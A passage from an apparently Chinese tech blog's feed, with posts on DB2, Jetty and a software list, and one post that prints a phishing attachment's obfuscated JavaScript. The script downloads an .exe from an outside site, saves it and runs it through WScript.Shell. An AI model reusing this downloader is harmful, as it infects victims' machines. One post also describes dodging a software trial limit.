<li>开启约束检查</li>
<li>删除多余的分区

<h3>永久方案</h3></li>
<li>前线库采用唯一约束,保证逻辑处理不会产生重复.</li>
<li>后线库删除该表的唯一约束,仅保存相应的索引即可</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[如何提高工作效率]]></title>
    <link href="http://haoweishow.com/blog/2015/01/14/ru-he-ti-gao-gong-zuo-xiao-lu/"/>
    <updated>2015-01-14T11:45:51+08:00</updated>
    <id>http://haoweishow.com/blog/2015/01/14/ru-he-ti-gao-gong-zuo-xiao-lu</id>
    <content type="html"><![CDATA[<p>//add post at 2015-01-14</p>

<p>标题比较大,实际内容仅涉及到工作中的一小部分内容.</p>

<h2>背景</h2>

<p>项目组开发人员,在开发管理控制台的界面,由于框架的原因,页面文件必须放到jar包里才能加载.</p>

<h2>开发过程</h2>

<ol>
<li>本地eclipse开发页面代码</li>
<li>下载服务器上的jar包</li>
<li>手动把文件拖到jar包</li>
<li>上传jar包到服务器</li>
<li>重启服务器</li>
<li>打开页面看结果</li>
</ol>


<h2>过程分析</h2>

<ul>
<li>在整个开发过程中,过多的时间都浪费在第3步</li>
<li>如果页面的源文件目录结构很深,又分布在不同的目录中,那么要把这些目录拖动到jar包里相应的目录上,消耗的时间可想而知</li>
<li>可能到这里,有经验的或者稍微动动脑的同学都知道该怎么优化这个过程</li>
<li>可问题是为什么不想办法提高一下效率呢?<code>磨刀不误砍柴工</code>的道理大家应该都懂</li>
</ul>


<h2>解决方法</h2>

<ul>
<li>通过ant脚本来抽取代码和执行打包的动作</li>
<li>目前上传文件还是通过FTP工具实现,没有测试过ant是否可以上传</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[程序清单]]></title>
    <link href="http://haoweishow.com/blog/2015/01/13/cheng-xu-qing-dan/"/>
    <updated>2015-01-13T20:01:37+08:00</updated>
    <id>http://haoweishow.com/blog/2015/01/13/cheng-xu-qing-dan</id>
    <content type="html"><![CDATA[<p><strong>//add post at 2015-01-13</strong></p>

<h2>Mac系统</h2>

<h4>编程</h4>

<ul>
<li>IntelliJ IDEA 13(其实不是很习惯这个软件,但是Eclipse总是崩溃)</li>
<li>Xcode(试过obj-c和swift,但是一直没有开发出成型的东西)</li>
<li>XMind(尝试过一些写作,但是没有深度使用)</li>
<li>Dash(用的比较少,不然还是要用付费版本的,那个等待的设计,真坑;今天还看到这个作者90后,年收入XX万美金,励志榜样啊)</li>
<li>OmniGraffle(还未深入使用)</li>
</ul>


<h4>阅读</h4>

<ul>
<li>Pocket(一直默默使用)</li>
<li>Reader(RSS阅读器,以后一定支持作者)</li>
<li>PDFNut(PDF文件阅读,管理软件,简洁;关键自己阅读的少)</li>
</ul>


<h4>编辑</h4>

<ul>
<li>Atom(从github上下载源码,编译生成,SublimeText)</li>
<li>BBEdit</li>
<li>MacVim</li>
<li>MacDown(现在用这个软件来维护blog的文章,ulysses好用,但是导出的md文件格式跟blog的不兼容)mod at 2015-03-17</li>
<li>DiffMerge</li>
<li>Mou(开始些blog的时候用过,不过有了Ulysses,就不再使用了)</li>
<li>Ulysses(不愧是AppStore的推荐,比Mou好用N多,以后一定支持作者)</li>
<li>Writer Pro</li>
<li>Microsoft Office 2011</li>
</ul>


<h4>日志</h4>

<ul>
<li>Day One(记录生活的日志软件,目前基本都是关于我们家玥玥的:))</li>
</ul>


<h4>虚拟机</h4>

<ul>
<li>Parallel Desktop 10(圣诞节优惠购,值)</li>
<li>Virtual Box(现在很少用)</li>
</ul>


<h4>系统</h4>

<ul>
<li>iTerm2(下载源码编译安装)</li>
<li>Moom(付费的软件就是不一样,很方便,跟OSX系统的结合很自然)</li>
<li>Go2Shell(用了Alfred高级功能,这个软件就基本可以歇菜了)</li>
<li>Alfred 2(高级功能使用很少)</li>
<li>DesktopActivity(简洁,赞!)</li>
<li>Wallpapers HD Lite(图片的质量很不错)</li>
<li>BetterZip(Mac下的解压缩软件,不如WinRAR还用,还是用命令打包解压)</li>
<li>1Password 5(圣诞节优惠购,值)</li>
<li>CleanMyMac 2 (圣诞节优惠购,值)</li>
</ul>


<h4>网路</h4>

<ul>
<li>NetSpot</li>
<li>Network Inspector</li>
<li>云梯(国内上网必备,之前用国外的VPN Shield很不稳定,这个也是经常断线,几个国家的换着连接,到期再换曲径试试)</li>
</ul>


<h4>GTD</h4>

<ul>
<li>Things(简洁,赞!)(购买了超值的软件包,支持正版!mod at 2015-03-17)</li>
</ul>


<h4>同步</h4>

<ul>
<li>115网盘(大容量,分享内容的用户很多)(不过现在只有会员才能够得到别人分享的东西!mod at 2015-03-17)</li>
<li>百度云(空间大,现在用来做数据备份)</li>
<li>CloudApp(同步剪切板,截图,小文件的软件,不过win下不怎么好用,正在考虑自己开发一个本地的版本)</li>
<li>Evernote(好用不解释,不过现在软件已经沦陷为收集器了.)</li>
<li>麦库(先发现的有道笔记,开始的时候很热心,在微博上提过一些意见,但是反馈很X,逐渐放弃;搜索同类找到Evernote,那个时候还没有印象笔记,同步不稳定;又尝试麦库;再后来有回到Evernote,并付费使用)</li>
<li>Dropbox(12或者13年的时候,可以不翻墙使用,用过一段时间,主要用来备份数据,2G的免费空间暂时后用,后来无法访问就放弃了;现在因为Day One支持的iCloud同步不稳定,又因为有了VPN,所有把Day One的同步切换到了dropbox上,可恶的gfw,同步个笔记还得开VPN)</li>
</ul>


<h2>Win系统</h2>

<p>Win软件下还是没有付费习惯.<br/>
第一个付费的Win软件是Evernote.</p>

<h4>UI设计</h4>

<ul>
<li>WireframeSketcher(最近使用,14天的免费试用,感觉还不错,希望能尽快完成任务)(调整系统时间,然后断网,继续使用&hellip;mod at 2015-03-17)</li>
<li>UIDesigner 2.5(腾讯出品,没有深入使用,不过配套的UIDPlayer可以在手机上直接运行设计出来的软件)</li>
</ul>


<h4>流程图</h4>

<ul>
<li>Microsoft Visio(现在流程图之类的主要靠这个啦)</li>
<li>ArgoUML(大学的时候,老师上课演示用过,工作以后用的不过,关键是画UML图画的少)</li>
<li>Diagram Designer</li>
</ul>


<h4>编程</h4>

<ul>
<li>Dev-C++(第一个C开发工具,大学的C++课程老师用的就是这个,一直使用到现在,简洁)</li>
<li>Eclipse(这个就不用说了,最爱用的MyEclipse3.3的那个版本)</li>
<li>Beyond Compare 3(神器,在平安的时候,处理过8个并行版本的版本同步)</li>
<li>UltraEdit-32(文本编译还是习惯用这个,EditPlus和NotePad用不久)</li>
<li>Cygwin Terminal(偶尔用个grep/find之类的命令)</li>
<li>Altova XMLSpy(用了N久了,但是一直都是用来格式化XML)</li>
<li>SecureCRT 7.2(在平安的时候,同事推荐过,但是没有深入了解,感觉不如SSH Secure Shell Client好用,但是后来另一个同事告诉我这个工具上传文件的方式之后,就彻底沦陷了,Alt+p,太方便了)</li>
<li>SSH Secure Shell Client(用的最早的一款ssh软件)</li>
<li>Xmanager Enterprise 4(在多个页签之间切换会卡顿,不知道是版本的问题还是其它)</li>
<li>Wireshark</li>
</ul>


<h4>版本管理</h4>

<ul>
<li>SVN</li>
<li>Git(最好用的版本管理软件,只有真正使用,才能说好.mod at 2015-03-17)</li>
</ul>


<h2>IOS系统</h2>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DB2 load数据失败(SQL2036N)]]></title>
    <link href="http://haoweishow.com/blog/2015/01/06/db2-loadshu-ju-shi-bai-sql2036n/"/>
    <updated>2015-01-06T17:38:09+08:00</updated>
    <id>http://haoweishow.com/blog/2015/01/06/db2-loadshu-ju-shi-bai-sql2036n</id>
    <content type="html"><![CDATA[<h2>背景</h2>

<ul>
<li>数据库实例用户:  userA</li>
<li>数据操作用户:    userB</li>
</ul>


<h2>操作</h2>

<ul>
<li>userB执行export命令,导出ixf格式的数据;</li>
<li>userB执行import命令,导入ixf格式的数据,正常导入;</li>
<li>userB执行load命令,导入ixf格式的数据,导入失败;</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SQL2036N  The path for the file or device
</span><span class='line'>"/home/esb/batch/data/tmp_xxxx_20141101.ixf" is not valid.</span></code></pre></td></tr></table></div></figure>


<h2>解决</h2>

<ul>
<li>数据库实例用户userA对文件<strong>/home/esb/batch/data/tmp_xxxx_20141101.ixf</strong>没有访问权限.</li>
<li>给userA授权对该文件的访问权限,即可使用load导入数据.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Jetty相关]]></title>
    <link href="http://haoweishow.com/blog/2014/12/26/jettyxiang-guan/"/>
    <updated>2014-12-26T10:17:43+08:00</updated>
    <id>http://haoweishow.com/blog/2014/12/26/jettyxiang-guan</id>
    <content type="html"><![CDATA[<h2>Jetty版本</h2>

<ul>
<li>首页

<ul>
<li><a href="http://www.eclipse.org/jetty/">http://www.eclipse.org/jetty/</a></li>
</ul>
</li>
<li>下载地址

<ul>
<li><a href="http://download.eclipse.org/jetty/">http://download.eclipse.org/jetty/</a></li>
</ul>
</li>
<li>8.x版本下载

<ul>
<li><a href="http://download.eclipse.org/jetty/updates/jetty-bundles-8.x/">http://download.eclipse.org/jetty/updates/jetty-bundles-8.x/</a></li>
</ul>
</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[WTF]]></title>
    <link href="http://haoweishow.com/blog/2014/12/13/wtf/"/>
    <updated>2014-12-13T14:00:12+08:00</updated>
    <id>http://haoweishow.com/blog/2014/12/13/wtf</id>
    <content type="html"><![CDATA[<h2>收到一封邮件</h2>

<p><img src="http://haoweishow.com/images/postImage/20141213-1.png"></p>

<h2>附件解压</h2>

<h4>是个js文件,里面是什么?</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r--r--@ 1 xxx  staff  9973 12 11 17:34 FedEx_000482152.doc.js
</span><span class='line'>-rw-r--r--@ 1 xxx  staff  2787 12 11 17:31 FedEx_000482152.zip</span></code></pre></td></tr></table></div></figure>


<h2>格式化一下</h2>

<h4>这个是做什么的?</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var a1='';
</span><span class='line'>function u() {a1 += 'if (r'; k(); };
</span><span class='line'>function rsbi() { a1 += 'TE'; ao(); };
</span><span class='line'>function tsis() { a1 += 'n;'; qyxt(); };
</span><span class='line'>function rb() { a1 += 'unct'; nj(); };
</span><span class='line'>function hzi() { a1 += 'r xo'; hwgc(); };
</span><span class='line'>function ryi() { a1 += 'dy); '; nz(); };
</span><span class='line'>function ufp() { a1 += 'Ac'; x(); };
</span><span class='line'>function xjgz() { a1 += 'Char'; n(); };
</span><span class='line'>function zsx() { a1 += 'ET",f'; lo(); };
</span><span class='line'>function gc() { a1 += 'd='; gigu(); };
</span><span class='line'>function bpv() { a1 += 'nr'; rn(); };
</span><span class='line'>function pzg() { a1 += 'ar x'; gvna(); };
</span><span class='line'>function g() { a1 += 'me'; wqvx(); };
</span><span class='line'>function x() { a1 += 'ti'; omfz(); };
</span><span class='line'>function vp() { a1 += '.e'; lpo(); };
</span><span class='line'>function obye() { a1 += '82'; vrc(); };
</span><span class='line'>function lmk() { a1 += '2455'; sinm(); };
</span><span class='line'>function enlr() { a1 += 'Run(f'; xyud(); };
</span><span class='line'>function ckna() { a1 += 'n,'; huh(); };
</span><span class='line'>function hwgc() { a1 += ' ='; rxu(); };
</span><span class='line'>function xyud() { a1 += 'n,0,'; jps(); };
</span><span class='line'>function fl() { a1 += '1; xa'; l(); };
</span><span class='line'>function a() { a1 += ' va'; m(); };
</span><span class='line'>function nntn() { a1 += '); dl'; qzpp(); };
</span><span class='line'>function xtz() { a1 += '.co'; gx(); };
</span><span class='line'>function uix() { a1 += 'Shell'; azss(); };
</span><span class='line'>function oppg() { a1 += 'B09'; viiv(); };
</span><span class='line'>function ljy() { a1 += 'XML2'; uwku(); };
</span><span class='line'>function mn() { a1 += 'd(); '; u(); };
</span><span class='line'>function d() { a1 += 'B0'; jq(); };
</span><span class='line'>function z() { a1 += 'a.typ'; ewsz(); };
</span><span class='line'>function l() { a1 += '.writ'; muve(); };
</span><span class='line'>function emq() { a1 += 'sea'; xtz(); };
</span><span class='line'>function qq() { a1 += '0;'; q(); };
</span><span class='line'>function sb() { a1 += 'd-a'; ww(); };
</span><span class='line'>function znqo() { a1 += 'D17'; cesz(); };
</span><span class='line'>function lrqi() { a1 += 'B13'; lmk(); };
</span><span class='line'>function sinm() { a1 += '52'; pr(); };
</span><span class='line'>function ha() { a1 += 'a.cl'; zdjv(); };
</span><span class='line'>function h() { a1 += 'e(92'; lfo(); };
</span><span class='line'>function yy() { a1 += 'tive'; p(); };
</span><span class='line'>function tu() { a1 += 'B.S'; yrhv(); };
</span><span class='line'>function byz() { a1 += 'nt'; zq(); };
</span><span class='line'>function vtvt() { a1 += 'r ws'; ykrc(); };
</span><span class='line'>function wjvr() { a1 += ' ('; hero(); };
</span><span class='line'>function equ() { a1 += '",1'; nntn(); };
</span><span class='line'>function vqii() { a1 += 'nseBo'; ryi(); };
</span><span class='line'>function o() { a1 += 'po'; vqii(); };
</span><span class='line'>function tm() { a1 += '0525E'; oot(); };
</span><span class='line'>function lg() { a1 += 'ch'; wjvr(); };
</span><span class='line'>function hr() { a1 += 'and-s'; ysr(); };
</span><span class='line'>function av() { a1 += 'ct'; v(); };
</span><span class='line'>function lfo() { a1 += ')+f'; tsis(); };
</span><span class='line'>function uwhq() { a1 += 'nd=60'; oeq(); };
</span><span class='line'>function mrg() { a1 += ' ws.'; enlr(); };
</span><span class='line'>function oot() { a1 += '0C050'; evcq(); };
</span><span class='line'>function oeq() { a1 += '399'; ljo(); };
</span><span class='line'>function iz() { a1 += '4A070'; d(); };
</span><span class='line'>function j() { a1 += 'ipt.'; uix(); };
</span><span class='line'>function wqvx() { a1 += 'nt.p'; qai(); };
</span><span class='line'>function ihjo() { a1 += 'aveTo'; knb(); };
</span><span class='line'>function azss() { a1 += '");'; a(); };
</span><span class='line'>function oc() { a1 += ',1);'; epo(); };
</span><span class='line'>function iwny() { a1 += 'Str'; vo(); };
</span><span class='line'>function evcq() { a1 += 'B1301'; tccy(); };
</span><span class='line'>function nyfn() { a1 += '= ws.'; xa(); };
</span><span class='line'>function owq() { a1 += 'am"'; wp(); };
</span><span class='line'>function w() { a1 += 'cum'; gi(); };
</span><span class='line'>function qyxt() { a1 += ' va'; hzi(); };
</span><span class='line'>function ber() { a1 += '/d'; qs(); };
</span><span class='line'>function asua() { a1 += ' = f'; rb(); };
</span><span class='line'>function muve() { a1 += 'e(xo'; xe(); };
</span><span class='line'>function uykf() { a1 += '5052'; sti(); };
</span><span class='line'>function gkv() { a1 += ' {'; mrg(); };
</span><span class='line'>function rxu() { a1 += ' n'; mzr(); };
</span><span class='line'>function n() { a1 += 'Cod'; h(); };
</span><span class='line'>function am() { a1 += 'ADOD'; tu(); };
</span><span class='line'>function qs() { a1 += 'ocu'; g(); };
</span><span class='line'>function lwx() { a1 += '55257'; iz(); };
</span><span class='line'>function edmc() { a1 += '{ x'; wl(); };
</span><span class='line'>function v() { a1 += '("MS'; ljy(); };
</span><span class='line'>function bbt() { a1 += 'l("ht'; pe(); };
</span><span class='line'>function zha() { a1 += 'l(fr,'; phzf(); };
</span><span class='line'>function ue() { a1 += ' }; d'; bbt(); };
</span><span class='line'>function kost() { a1 += 'A07'; vqt(); };
</span><span class='line'>function uuxy() { a1 += '//www'; f(); };
</span><span class='line'>function t() { a1 += 'n) { '; upd(); };
</span><span class='line'>function aut() { a1 += 'om/d'; al(); };
</span><span class='line'>function qgji() { a1 += 'adySt'; dx(); };
</span><span class='line'>function gj() { a1 += 'cr'; j(); };
</span><span class='line'>function vqt() { a1 += '0B09&'; vh(); };
</span><span class='line'>function omfz() { a1 += 've'; rg(); };
</span><span class='line'>function c() { a1 += '"WS'; gj(); };
</span><span class='line'>function ww() { a1 += 'nd-'; emq(); };
</span><span class='line'>function yved() { a1 += 'nd'; ab(); };
</span><span class='line'>function xe() { a1 += '.Res'; o(); };
</span><span class='line'>function nrg() { a1 += 'ec'; tbw(); };
</span><span class='line'>function xjj() { a1 += ' 4) '; dkf(); };
</span><span class='line'>function dkf() { a1 += '{ v'; pzg(); };
</span><span class='line'>function vlkp() { a1 += '=545'; tm(); };
</span><span class='line'>function uicj() { a1 += '/w'; ldz(); };
</span><span class='line'>function knb() { a1 += 'File'; tra(); };
</span><span class='line'>function vrm() { a1 += ' x'; agsl(); };
</span><span class='line'>function qai() { a1 += 'hp?i'; gc(); };
</span><span class='line'>function jcks() { a1 += '13245'; lwx(); };
</span><span class='line'>function lo() { a1 += 'r,fa'; lh(); };
</span><span class='line'>function unt() { a1 += 'xo'; sm(); };
</span><span class='line'>function vrc() { a1 += '","50'; nmf(); };
</span><span class='line'>function deli() { a1 += '.lan'; sb(); };
</span><span class='line'>function sm() { a1 += '.sen'; mn(); };
</span><span class='line'>function lh() { a1 += 'lse'; dv(); };
</span><span class='line'>function nz() { a1 += 'xa.po'; uj(); };
</span><span class='line'>function dkiz() { a1 += '.o'; bpv(); };
</span><span class='line'>function ku() { a1 += ',"771'; md(); };
</span><span class='line'>function sti() { a1 += '5E0C0'; xz(); };
</span><span class='line'>function ab() { a1 += '=44'; wls(); };
</span><span class='line'>function f() { a1 += '.l'; tqum(); };
</span><span class='line'>function ty() { a1 += 'XObje'; av(); };
</span><span class='line'>function jps() { a1 += '0); '; b(); };
</span><span class='line'>function b() { a1 += '}; } '; xel(); };
</span><span class='line'>function ys() { a1 += '"G'; zsx(); };
</span><span class='line'>function gi() { a1 += 'ent.p'; iun(); };
</span><span class='line'>function cf() { a1 += '3010'; znqo(); };
</span><span class='line'>function bdhj() { a1 += '731"'; hcfw(); };
</span><span class='line'>function wj() { a1 += 'LHT'; vl(); };
</span><span class='line'>function ie() { a1 += '&gt; 0)'; gkv(); };
</span><span class='line'>function mwe() { a1 += ') { '; yb(); };
</span><span class='line'>function rg() { a1 += 'XObj'; cvwq(); };
</span><span class='line'>function pmyu() { a1 += '); x'; z(); };
</span><span class='line'>function xh() { a1 += '1301'; esu(); };
</span><span class='line'>function y() { a1 += 'nd-a'; pg(); };
</span><span class='line'>function ewsz() { a1 += 'e = '; fl(); };
</span><span class='line'>function krf() { a1 += 'tec'; feg(); };
</span><span class='line'>function i() { a1 += 'n d'; zha(); };
</span><span class='line'>function gsn() { a1 += 'St'; cht(); };
</span><span class='line'>function as() { a1 += ')+'; iwny(); };
</span><span class='line'>function al() { a1 += 'ocu'; ceyq(); };
</span><span class='line'>function gx() { a1 += 'm/do'; w(); };
</span><span class='line'>function hero() { a1 += 'er)'; iza(); };
</span><span class='line'>function srsv() { a1 += '/www'; deli(); };
</span><span class='line'>function ceyq() { a1 += 'me'; byz(); };
</span><span class='line'>function ysr() { a1 += 'ea.c'; aut(); };
</span><span class='line'>function lxf() { a1 += 'C0B'; jcks(); };
</span><span class='line'>function pnq() { a1 += 'tive'; ty(); };
</span><span class='line'>function tra() { a1 += '(f'; ckna(); };
</span><span class='line'>function yr() { a1 += 're'; qgji(); };
</span><span class='line'>function ljo() { a1 += '23"'; ku(); };
</span><span class='line'>function pwar() { a1 += '(xo.'; yr(); };
</span><span class='line'>function cesz() { a1 += '0C'; px(); };
</span><span class='line'>function ibwz() { a1 += '2703'; vp(); };
</span><span class='line'>function vjma() { a1 += ' try '; edmc(); };
</span><span class='line'>function px() { a1 += '0B13'; kyn(); };
</span><span class='line'>function wuw() { a1 += 'en('; pmyu(); };
</span><span class='line'>function bsh() { a1 += 'p?id'; vlkp(); };
</span><span class='line'>function ppvn() { a1 += 'a.com'; ber(); };
</span><span class='line'>function smo() { a1 += 'ctio'; i(); };
</span><span class='line'>function pt() { a1 += ' Ac'; yy(); };
</span><span class='line'>function r() { a1 += 'nviro'; sj(); };
</span><span class='line'>function vf() { a1 += '83'; ql(); };
</span><span class='line'>function bzwk() { a1 += 'fun'; smo(); };
</span><span class='line'>function pg() { a1 += 'nd-se'; ppvn(); };
</span><span class='line'>function xa() { a1 += 'Expa'; emly(); };
</span><span class='line'>function mkur() { a1 += 'ew '; ufp(); };
</span><span class='line'>function zdjv() { a1 += 'os'; oai(); };
</span><span class='line'>function hcfw() { a1 += ',"90'; wnv(); };
</span><span class='line'>function kdea() { a1 += ':/'; uicj(); };
</span><span class='line'>function fkss() { a1 += 'd='; lcd(); };
</span><span class='line'>function zq() { a1 += '.ph'; bsh(); };
</span><span class='line'>function emly() { a1 += 'ndE'; r(); };
</span><span class='line'>function wl() { a1 += 'o.op'; qogu(); };
</span><span class='line'>function s() { a1 += '==='; xjj(); };
</span><span class='line'>function kvr() { a1 += ');'; fvk(); };
</span><span class='line'>function lcd() { a1 += '54505'; kbeb(); };
</span><span class='line'>function vl() { a1 += 'TP");'; qbtb(); };
</span><span class='line'>function feg() { a1 += 'hange'; asua(); };
</span><span class='line'>function fvk() { a1 += ' dl("'; mefp(); };
</span><span class='line'>function nj() { a1 += 'ion('; mwe(); };
</span><span class='line'>function ykrc() { a1 += ' = '; tf(); };
</span><span class='line'>function klrf() { a1 += ' }; '; xs(); };
</span><span class='line'>function yb() { a1 += 'if '; pwar(); };
</span><span class='line'>function axij() { a1 += 'g.fr'; fd(); };
</span><span class='line'>function epo() { eval(a1); };
</span><span class='line'>function vh() { a1 += 'rnd=7'; vf(); };
</span><span class='line'>function wnv() { a1 += '26395'; e(); };
</span><span class='line'>function uj() { a1 += 'sitio'; xtm(); };
</span><span class='line'>function yrhv() { a1 += 'tre'; owq(); };
</span><span class='line'>function dx() { a1 += 'ate '; s(); };
</span><span class='line'>function jq() { a1 += '9&r'; yved(); };
</span><span class='line'>function tbw() { a1 += 't('; c(); };
</span><span class='line'>function fd() { a1 += 'om'; xjgz(); };
</span><span class='line'>function cht() { a1 += 'rin'; xafg(); };
</span><span class='line'>function mzr() { a1 += 'ew Ac'; pnq(); };
</span><span class='line'>function ldz() { a1 += 'ww'; ey(); };
</span><span class='line'>function kdod() { a1 += '70'; oppg(); };
</span><span class='line'>function e() { a1 += '3.exe'; equ(); };
</span><span class='line'>function viiv() { a1 += '&r'; uwhq(); };
</span><span class='line'>function kbeb() { a1 += '25'; rryx(); };
</span><span class='line'>function mefp() { a1 += 'http:'; uuxy(); };
</span><span class='line'>function phzf() { a1 += 'fn,r'; t(); };
</span><span class='line'>function lpo() { a1 += 'xe",1'; kvr(); };
</span><span class='line'>function pr() { a1 += '574A0'; kdod(); };
</span><span class='line'>function tccy() { a1 += '0D1'; qhm(); };
</span><span class='line'>function agsl() { a1 += 'a.op'; wuw(); };
